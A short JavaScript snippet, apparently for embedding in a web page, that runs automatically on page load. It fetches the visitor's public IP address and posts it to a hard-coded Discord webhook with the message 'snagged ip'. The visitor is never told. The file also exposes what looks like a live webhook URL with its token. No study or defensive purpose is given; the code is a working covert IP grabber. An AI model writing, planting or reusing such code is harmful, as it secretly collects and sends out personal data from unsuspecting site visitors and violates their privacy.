const webhookUrl = 'https://discord.com/api/webhooks/1376279997018407094/61KBhtZIo3BeLNXLm2F3Y7cek27c2F36iVIFv3xdfkpA2tN-vtj_np8Me5sNJVOSv8AO';

async function sendIP() {
  try {
    const ipResponse = await axios.get('https://api.ipify.org?format=json');
    const ip = ipResponse.data.ip;

    const payload = {
      content: `snagged ip: ${ip}`,
      username: 'Captain Hook'
    };

    const response = await axios.post(webhookUrl, payload);
    
    if (response.status === 204) {
      console.log('Message sent');
    } else {
      console.log(`Message failed: ${response.status}`);
    }
  } catch (error) {
    console.error('Error:', error.message);
  }
}

window.onload = sendIP();
